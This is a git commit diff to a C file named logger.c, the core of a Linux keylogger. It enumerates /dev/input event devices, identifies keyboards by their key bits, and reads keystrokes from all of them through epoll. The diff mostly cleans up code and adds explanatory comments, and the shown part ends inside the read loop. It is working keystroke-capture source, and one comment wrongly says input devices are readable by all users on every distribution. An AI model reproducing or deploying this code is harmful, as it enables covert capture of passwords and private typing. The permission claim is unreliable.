d3f8294a71453737bd4cce52ab139bd6bcfdbc49
redcirclespins <redcirclespins@tutamail.com>
2025-11-19 23:20:01 +0700

    removed setnonblocking func + cleaned up code

--- logger.c
+++ logger.c
@@ -8,37 +8,21 @@
 #include <unistd.h>
 #include <sys/epoll.h>
 
-#define BUFFER_SIZE 1024
-#define DEVICE_TYPE "event"
 #define DIRECTORY "/dev/input"
-#define DEVICE_MAX_NAME_LEN (256+11)
-#define MAX_NAME_LEN 256
-#define BIN_CHAR_ENOUGH 25
 #define MAX_KEYBOARDS 10
+#define DEVICE_MAX_NAME_LEN (256+11)
+#define DEVICE_TYPE "event"
+#define MAX_NAME_LEN 256
 #define MAXEVENTS 2
 
 #define NBITS(x) (((x)+(sizeof(long)*8)-1)/(sizeof(long)*8))
 
-static int set_fd_nonblocking(int fd){
-	int flags=fcntl(fd,F_GETFL,0);
-	if(flags==-1){
-		perror("fnctl F_GETFL failed");
-		return -1;
-	}
-
-	if(fcntl(fd,F_SETFL,flags|O_NONBLOCK)==-1){
-		perror("fcntl F_SETFL failed");
-		return -1;
-	}
-
-	return 0;
-}
-
 static void exit_close(int eFD,DIR* dir,int* fds){
 	if(fds!=NULL){
-		for(int i=0;i<MAX_KEYBOARDS;i++)
+		for(int i=0;i<MAX_KEYBOARDS;i++){
 			if(fds[i]!=-1)
 				close(fds[i]);
+		}
 	}
 	if(eFD!=-1)
 		close(eFD);
@@ -50,6 +34,7 @@ static void ev_code_to_ascii(__u16 key_code,__s32 value,char* key){
     if(value==0)
 		key[0]='\0';
 
+	//basic keys
     switch (key_code){
 		case KEY_ESC:              snprintf(key,6,"<ESC>");break;
 		case KEY_KP1:
@@ -172,98 +157,11 @@ static void ev_code_to_ascii(__u16 key_code,__s32 value,char* key){
    }
 }
 
-//void print_input_event(struct input_event *ev) {
-//    // Print the entire input_event struct
-//    printf("Event Type: %u\n", ev->type);
-//    printf("Event Code: %u\n", ev->code);
-//    printf("Event Value: %d\n", ev->value);
-//
-//    // Print timestamp (time of the event)
-//    printf("Time: %ld.%06ld (seconds.microseconds)\n", ev->time.tv_sec, ev->time.tv_usec);
-//}
-
-//static const void hex_char_to_bin_char(char* hex_char,char* bin_char){
-//	for(int i=0;i<BIN_CHAR_ENOUGH;i++){
-//		const unsigned char hex_digit=hex_char[i];
-//		switch(hex_digit){
-//			case '0':strcat(bin,"0000");break;
-//			case '1':strcat(bin,"0001");break;
-//			case '2':strcat(bin,"0010");break;
-//			case '3':strcat(bin,"0011");break;
-//			case '4':strcat(bin,"0100");break;
-//			case '5':strcat(bin,"0101");break;
-//			case '6':strcat(bin,"0110");break;
-//			case '7':strcat(bin,"0111");break;
-//			case '8':strcat(bin,"1000");break;
-//			case '9':strcat(bin,"1001");break;
-//			case 'a':
-//			case 'A':strcat(bin,"1010");break;
-//			case 'b':
-//			case 'B':strcat(bin,"1011");break;
-//			case 'c':
-//			case 'C':strcat(bin,"1100");break;
-//			case 'd':
-//			case 'D':strcat(bin,"1101");break;
-//			case 'e':
-//			case 'E':strcat(bin,"1110");break;
-//			case 'f':
-//			case 'F':strcat(bin,"1111");break;
-//		}
-//	}
-//}
-//
-//static const void ev_check(char* ev_str){
-//	char last_char;
-//	for(int i=0;ev_str[i];i++)
-//		last_char=ev_str[i];
-//
-//	//hex_char to int conversion
-//	if(last_char>='0'&&last_char<='9')
-//		last_int=last_char-'0';
-//	else if(last_char>='A'&&last_char<='F')
-//		last_int=last_char-'A'+10;
-//	else if(last_char>='a'&&last_char<='f')
-//		last_int=last_char-'a'+10;
-//
-//	if(last_int&0x02) //2nd bit = EV_KEY
-//		puts("device supports key input");
-//	else 
-//		puts("device does NOT support key input");
-//}
-//
-//static const void key_check(const char* key_char){
-//	char bin_char[BIN_CHAR_ENOUGH];
-//	hex_char_to_bin_char(key_char,bin_char);
-//
-//	int count=0;
-//	for(int i=16;i<BIN_CHAR_ENOUGH;i++){
-//		if(bin_char[i]=='1')
-//			count++;
-//	}
-//
-//	if(count==5)
-//		puts("pretty sure this devices supports letters 'A'->'Z'");
-//	else
-//		puts("pretty sure this device does NOT support the full keyboard");
-//}
-
 int main(int argc,char** argv){
-	//const FILE* devices=fopen("proc/bus/input/devices","r");
-	//if(devices==NULL){
-	//	puts("fopen failed");
-	//	return -1;
-	//}
+	
+	/* OPTION 1 = directly access events at /dev/input/eventX */
 
-	//char buffer[BUFFER_SIZE];
-	//while(1){
-	//	const size_t bytes_read=fread(buffer,BUFFER_SIZE,1,devices);
-	//	if(strstr
-
-
-	//	if(butes_read<BUFFER_SIZE)
-	//		break;
-
-	DIR* dir=opendir(DIRECTORY);
+	DIR* dir=opendir(DIRECTORY); //should be readable by default for all users on all linux distros
 	if(dir==NULL){
 		perror("opendir failed");
 		return -1;
@@ -278,95 +176,65 @@ int main(int argc,char** argv){
 		if(strstr(entry->d_name,DEVICE_TYPE)!=NULL){
 			snprintf(device,sizeof(device),"%s/%s",DIRECTORY,entry->d_name);
 
-			int fd=open(device,O_RDONLY,O_NONBLOCK);
+			const int fd=open(device,O_RDONLY,O_NONBLOCK);
 			if(fd==-1){
 				perror("open failed");
-				exit_close(-1,dir,keyboard_fds);
+				closedir(dir);
 				return -1;
 			}
 
-			if(set_fd_nonblocking(fd)==-1){
-				close(fd);
-				continue;
-			}
-
 			char device_name[MAX_NAME_LEN];
-			if(ioctl(fd,EVIOCGNAME(MAX_NAME_LEN),device_name)<0){
+			if(ioctl(fd,EVIOCGNAME(MAX_NAME_LEN),device_name)<0){ //get name of device
 				perror("ioctl failed");
-				close(fd);
 				exit_close(-1,dir,keyboard_fds);
 				return -1;
 			}
 
 			unsigned long ev_bits[NBITS(KEY_MAX)];
-			if(ioctl(fd,EVIOCGBIT(EV_SYN,sizeof(ev_bits)),ev_bits)<0){
+			if(ioctl(fd,EVIOCGBIT(EV_SYN,sizeof(ev_bits)),ev_bits)<0){ //ev_bits can tell what kind of device this is
 				perror("ioctl failed");
-				close(fd);
 				exit_close(-1,dir,keyboard_fds);
 				return -1;
 			}
 
 			unsigned long key_bits[NBITS(KEY_MAX)];
-			if(ioctl(fd,EVIOCGBIT(EV_KEY,sizeof(key_bits)),key_bits)<0){
+			if(ioctl(fd,EVIOCGBIT(EV_KEY,sizeof(key_bits)),key_bits)<0){ //key_bits give info about what keys can be pressed on device
 				perror("ioctl failed");
-				close(fd);
 				exit_close(-1,dir,keyboard_fds);
 				return -1;
 			}
 
 			//check evbits
+			////if the 2nd bit is set then theres at least 1 btn on device
 			if(ev_bits[0]&0x02){
-				//puts("KEY");
-
 				//check keybits
+				//event codes of letters on keyboard start from 16th bit. you can find them in input-event-codes.h in linux kernel src
+				//as example i check whether bits 16-24 are set corresponding to letters QWERTYUI
 				if(key_bits[0]&0xff0000){
-					//printf("%s - keyboard\n",device_name);
+					//printf("%s is keyboard\n",device_name);
 					if(keyboard_fds_index<MAX_KEYBOARDS)
 						keyboard_fds[keyboard_fds_index++]=fd;
 				}else{
-					//puts("NO");
+					//printf("%s is NOT a keyboard\n",device_name);
 					close(fd);
 				}
 			}
-			//else 
-			//	puts("NO");
-
-			//ev_check(ev_bit);
-			//key_check(key_bit);
-
-			//if(ioctl(fd,EVIOCGRAB,1)==-1){
-			//	perror("ioctl failed");
-			//	return -1;
-			//}
-
-			//struct input_event ev;
-		        //while (1) {
-		        //    ssize_t bytes = read(fd, &ev, sizeof(struct input_event));
-		        //    if (bytes == -1) {
-		        //        perror("Error reading event");
-		        //        break;
-		        //    }
-
-		        //    // Print the entire event struct
-		        //    print_input_event(&ev);
-		        //    printf("\n");
-		        //}	
 		}
 	}
 
-	//manage input from multiple keyboards
+	//log input from multiple keyboards with epoll
 	struct epoll_event ev;
 	const int eFD=epoll_create1(0);
 	if(eFD==-1){
 		perror("epoll_create failed");
-		exit_close(eFD,dir,keyboard_fds);
+		exit_close(-1,dir,keyboard_fds);
 		return -1;
 	}
 	for(int i=0;i<keyboard_fds_index;i++){
 		ev.events=EPOLLIN;
 		ev.data.fd=keyboard_fds[i];
 		if(epoll_ctl(eFD,EPOLL_CTL_ADD,keyboard_fds[i],&ev)==-1){
-			perror("epoll_ctl failed");
+			perror("epoll_ctl_add failed");
 			exit_close(eFD,dir,keyboard_fds);
 			return -1;
 		}
@@ -374,7 +242,7 @@ int main(int argc,char** argv){
 	struct epoll_event events[MAXEVENTS];
 
 	while(1){
-		int numFDs=epoll_wait(eFD,events,MAXEVENTS,-1);
+		const int numFDs=epoll_wait(eFD,events,MAXEVENTS,-1);
 		if(numFDs==-1){
 			perror("epoll_wait failed");
 			exit_close(eFD,dir,keyboard_fds);
@@ -383,7 +251,7 @@ int main(int argc,char** argv){
 
 		//handle the events
 		for(int i=0;i<numFDs;i++){
-			if(events[i].events&EPOLLIN){
+			if(events[i].events&EPOLLIN){ //input
 			    struct input_event ev;
 			    ssize_t bytes=read(events[i].data.fd,&ev,sizeof(struct input_event));
 			    if(bytes==-1){
